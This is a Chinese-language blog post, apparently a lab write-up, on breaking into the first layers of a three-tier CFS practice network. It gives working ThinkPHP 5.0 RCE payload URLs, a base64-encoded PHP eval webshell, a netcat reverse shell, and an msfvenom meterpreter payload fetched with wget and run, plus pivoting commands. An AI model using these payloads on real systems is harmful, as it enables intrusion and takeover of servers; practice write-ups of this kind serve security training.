@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>CFS靶机实战演练-从外网杀进三层内网，横向渗透拿到Flag | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CFS靶机实战演练-从外网杀进三层内网，横向渗透拿到Flag</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 18, 2020&nbsp;&nbsp;18:51:25</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/RedTeaming/">RedTeaming</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29415950&auto=1&height=66"></iframe>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个靶机是 <code>TeamsSix</code>前辈 出的一个靶场，偏向于<code>CTF</code>，但是我认为它更适合真实环境！<code>CFS</code>靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每一层的<code>Flag</code>进行拿分！如果想要获取这个靶场的话，大家可以在我的公众号”<code>saulGoodman</code>“回复”<code>CFS</code>“获取<code>OVA</code>文件下载地址！</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>打开靶机的时候需要对它 <code>IP</code> 进行简单的更改！我在 <code>VMware</code> 设置了虚拟网络，其中<code>桥接</code>（VMnet0）我设置成和我PC是同一块网卡！（具体选择那块网卡就在<code>网络适配器选项</code>那里选择自己用的网卡）因为你不选择网卡的话 <code>VMware</code> 会自动选择一块网卡，很有可能导致桥接无法上网！</p>
+<p>然后我又设置了 <code>VMnet1</code>（仅主机模式）、<code>VMnet2</code>（仅主机模式），这两个个网络是<code>不出外网</code>的，也就是当做我们的<code>内网主机</code>！其中它们的子网地址分别是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VMnet1: 子网IP：192.168.22.0	 子网掩码：255.255.255.0</span><br><span class="line">VMnet2：子网IP：192.168.33.0	子网掩码：255.255.255.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1087.png" alt="图片"></p>
+<p>设置好虚拟网络之后我们打开靶机还需要设置一下他们的<code>IP</code>！这里我要编辑一下 <code>Target1</code> 的 <code>IP</code> 和<code>子网掩码</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig ens37 192.168.22.11 netmask 255.255.255.0</span><br><span class="line">注释：ens37 是我们的仅主机模式（VMnet1）的网卡</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1088.png" alt="图片"></p>
+<p>设置完 <code>Target1</code> 我们还需要设置 <code>Target2</code> 的网络：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig ens33 192.168.22.22 netmask 255.255.255.0</span><br><span class="line">ipconfig ens38 192.168.33.22 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1089.png" alt="图片"></p>
+<p>而 <code>Targert3</code> 就不需要设置了，它已经被设置为 <code>192.168.33.33</code> 这个<code>静态IP</code>了：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1090.png" alt="图片"></p>
+<p>设置完之后我们就可以对这个靶机开始渗透了！</p>
+<h2 id="攻击拓扑图"><a href="#攻击拓扑图" class="headerlink" title="攻击拓扑图"></a>攻击拓扑图</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1091.png" alt="图片"></p>
+<h2 id="外部打点"><a href="#外部打点" class="headerlink" title="外部打点"></a>外部打点</h2><p>先对 <code>Targer1</code> 进行信息搜集端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T5 192.168.1.103 --script=vuln</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~# nmap -A -T5 192.168.1.103 --script=vuln</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 00:14 EST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Stats: 0:09:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 98.77% done; ETC: 00:24 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 192.168.1.103</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:7.4: </span><br><span class="line">|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919</span><br><span class="line">|_    	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-vuln-cve2011-3192: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Apache byterange filter DoS</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2011-3192  BID:49303</span><br><span class="line">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="line">|       overlapping byte ranges are requested.</span><br><span class="line">|     Disclosure date: 2011-08-19</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="line">|       https://www.tenable.com/plugins/nessus/55976</span><br><span class="line">|       https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="line">|_      https://www.securityfocus.com/bid/49303</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|_  100000  3,4          111/udp6  rpcbind</span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8888/tcp open  http    Ajenti http control panel</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /robots.txt: Robots file</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">MAC Address: 00:0C:29:5A:1C:5E (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.16 ms 192.168.1.103</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 566.01 seconds</span><br></pre></td></tr></table></figure>
+
+<p>扫描出来之后发现它开放了 <code>21</code>（ftp）、<code>22</code>（ssh）、<code>80</code>（http）、<code>111</code>（RPC）、<code>888</code>（http）、<code>3306</code>（Mysql）、<code>8888</code>（http）这些端口服务！</p>
+<p>其中扫出来了好多漏洞，例如：</p>
+<p> <code>CVE-2011-1002</code>（Avahi Dos攻击）Avahi是Linux下常用的类DNS服务。它可以帮助主机在没有DNS服务的局域网中，发现基于Zeroconf协议的设备和服务。该工具工作于UDP 5353端口。在0.6.29版本之前，该服务存在CVE-2011-1002漏洞。Nmap的broadcast-avahi-dos脚本会寻找本地网络的DNS服务器，并发送空的UDP包。如果存在该漏洞，就可以导致服务器奔溃。</p>
+<p> <code>CVE-2018-15919</code>（OpenSSH信息泄露漏洞）其中CVE-2018-15919影响自2011年9月6日发布的5.9版本到今年8月24日发布的最新版本7.8。CVE-2018-15473则影响自1999年以来至今年7.7版本中所有版本，远程攻击者可利用漏洞猜测在OpenSSH服务器上注册的用户名。</p>
+<p> <code>CVE-2017-15906</code>，7.6之前的OpenSSH中sftp-server.c中的process_open函数不能正确阻止只读模式下的写操作，这使攻击者可以创建零长度文件。</p>
+<p> <code>CVE-2011-3192</code>（Apache HTTP Server CVE-2011-3192拒绝服务漏洞）Apache HTTP Server是一款开源的流行的HTTPD服务程序。当处理包含大量Ranges头的HTTP请求时，ByteRange过滤器存在一个错误，攻击者可以向服务器发送特制HTTP请求，消耗大量内存，造成应用程序崩溃。</p>
+<p> <code>CVE-2007-6750</code>，Apache HTTP服务器1.x和2.x允许远程攻击者通过部分HTTP请求导致拒绝服务(守护进程中断)，如Slowloris所示，这与2.2.15之前版本中缺少mod_ReqTimeout模块有关。</p>
+<p> 这些扫描出来的漏洞没什么可利用的价值，我们还是先看看它的 <code>web</code> 吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1092.png" alt="图片"></p>
+<h2 id="ThinkPHP-V5-0-RCE-Getshell"><a href="#ThinkPHP-V5-0-RCE-Getshell" class="headerlink" title="ThinkPHP-V5.0-RCE-Getshell"></a>ThinkPHP-V5.0-RCE-Getshell</h2><p>打开后发现它是 <code>ThinkPHP</code> 框架，版本是 <code>V5.0</code>，这个时候我想起了它存在一个 <code>RCE</code>（远程命令执行），于是我利用网上的 <code>POC</code> 对它进行试探发现存在命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1093.png" alt="图片"></p>
+<p>紧接着我写入一句话到 <code>cmd.php</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; cmd.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1094.png" alt="图片"></p>
+<p>写入成功是成功了，但是我们的 <code>$_POST</code> 被过滤掉了，估计有防护机制：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1095.png" alt="图片"></p>
+<p>对于这种过滤，我们可以使用一些编码来绕过，例如 <code>URL编码</code>、<code>BASE64编码</code>…等等，我使用的是<code>Base64</code>编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">编码前：&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br><span class="line">编码后：PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=</span><br><span class="line">POC: echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=&quot; | base64 -d &gt; cmd.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1096.png" alt="图片"></p>
+<p>随后重新写入一句话到 <code>cmd.php</code> 获取到 <code>webshell</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;|base64 -d &gt; cmd.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1097.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1098.png" alt="图片"></p>
+<p>这里还有另一种方法！既然它可以执行命令那么我们直接让他反弹<code>shell</code>到我们的<code>nc</code>就可以了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KALI：nc -lnvp 6666</span><br><span class="line">目标：nc 192.168.1.104 6666 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1099.png" alt="图片"></p>
+<p>这个时候成功获取 <code>shell</code>！随后我用<code>python</code>获取一枚 <code>bash</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1100.png" alt="图片"></p>
+<h2 id="杀入第一层内网Target1"><a href="#杀入第一层内网Target1" class="headerlink" title="杀入第一层内网Target1"></a>杀入第一层内网Target1</h2><p>获取到 <code>shell</code> 后在网站的 <code>/www/wwwroot/ThinkPHP/public</code> 目录下获取到了一个 <code>Flag</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1101.png" alt="图片"></p>
+<p>接着查看 <code>robots.txt</code> 文件得到第二个 <code>Flag</code>:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1102.png" alt="图片"></p>
+<p>随后在系统根目录下拿到了第三个 <code>Flag</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1103.png" alt="图片"></p>
+<h2 id="杀入第二层内网Target2"><a href="#杀入第二层内网Target2" class="headerlink" title="杀入第二层内网Target2"></a>杀入第二层内网Target2</h2><p>首先我是先查看了系统内核，发现他是<code>2019</code>年，<code>x86</code>位的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1104.jpg" alt="图片"></p>
+<p>那么我还是先用 <code>MSF</code> 生成一个可执行文件来反弹一枚<code>shell</code>吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 -f elf &gt; 4444.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1105.jpg" alt="图片"></p>
+<p>生成完后我们需要把木马上传到目标主机，我是用 <code>python</code> 打开了 <code>Web</code> 服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8090</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1106.jpg" alt="图片"></p>
+<p>然后在目标主机中使用 <code>wget</code> 下载我们的木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.104:8090/4444.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1107.jpg" alt="图片"></p>
+<p>最后给 <code>4444.elf</code> 一个<code>可执行</code>权限并运行成功上线：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 4444.elf</span><br><span class="line">./4444.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1108.jpg" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1109.jpg" alt="图片"></p>
+<p>上线之后我查看 <code>ifconfig</code> 发现他有<code>五</code>个网卡：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ifconfig </span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">============</span><br><span class="line">Name         : ens33</span><br><span class="line">Hardware MAC : 00:0c:29:5a:1c:5e</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.1.103</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::1be:3f23:9cb6:8513</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  3</span><br><span class="line">============</span><br><span class="line">Name         : ens37</span><br><span class="line">Hardware MAC : 00:0c:29:5a:1c:68</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.22.128</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv4 Address : 192.168.22.11</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::28fe:91ab:c417:d360</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  4</span><br><span class="line">============</span><br><span class="line">Name         : virbr0</span><br><span class="line">Hardware MAC : 52:54:00:5a:99:42</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  5</span><br><span class="line">============</span><br><span class="line">Name         : virbr0-nic</span><br><span class="line">Hardware MAC : 52:54:00:5a:99:42</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : BROADCAST,MULTICAST</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>
+
+<p>其中可用的网卡就是这两个：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1110.jpg" alt="图片"></p>
+<p>紧接着我使用 <code>MSF</code> 中的这个命令获取当前的网段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1111.jpg" alt="图片"></p>
